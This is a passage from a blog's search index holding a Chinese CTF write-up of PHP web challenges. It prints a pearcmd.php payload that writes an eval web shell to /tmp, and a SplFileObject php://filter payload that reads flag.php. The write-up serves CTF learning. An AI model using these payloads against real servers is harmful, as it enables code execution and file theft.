class="language-php">?+config-create+&#x2F;&amp;sdpc&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;&lt;?eval($_POST[0]);?&gt;+&#x2F;tmp&#x2F;hello.php</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678004112573-9e6a567b-86ce-4314-b98e-99214b391728.png" alt="output.png"></p><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><blockquote><p><a href="https://www.anquanke.com/post/id/284901">https://www.anquanke.com/post/id/284901</a></p></blockquote><p>就做出来了这一个，还是抄的。。。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677900359894-8183856c-3d9a-409b-9d34-eea5aff2dcb3.png" alt="image.png"></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);$g &#x3D; $_GET[&#39;g&#39;];$t &#x3D; $_GET[&#39;t&#39;];echo new $g($t);</code></pre><p>根据图片，直接传入payload：</p><pre class="language-php" data-language="php"><code class="language-php">?g&#x3D;SplFileObject&amp;t&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2><meta name="referrer" content="no-referrer" />]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
